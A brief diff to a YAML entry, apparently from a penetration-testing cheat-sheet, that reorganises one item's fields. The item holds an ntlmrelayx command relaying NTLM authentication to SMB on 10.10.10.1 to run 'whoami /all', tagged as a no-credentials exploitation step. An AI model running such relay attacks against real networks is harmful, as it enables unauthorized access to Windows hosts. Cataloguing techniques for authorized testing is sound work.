@@ -8,15 +8,13 @@ description: |
 
   	Target IP: 10.10.10.1
 
+command: |
+  python3 ntlmrelayx.py -smb2support -t smb://10.10.10.1 -c 'whoami /all' -debug
 items:
-  No_Creds:
-    - code: |
-        python3 ntlmrelayx.py -smb2support -t smb://10.10.10.1 -c 'whoami /all' -debug
-filters:
-  Linux:
-    - code: |
-        empty
-  Windows:
-    - code: |
-        empty
+  - No_Creds
+OS:
+  - Linux
+  - Windows
+attack_types:
+  - Exploitation
 ---
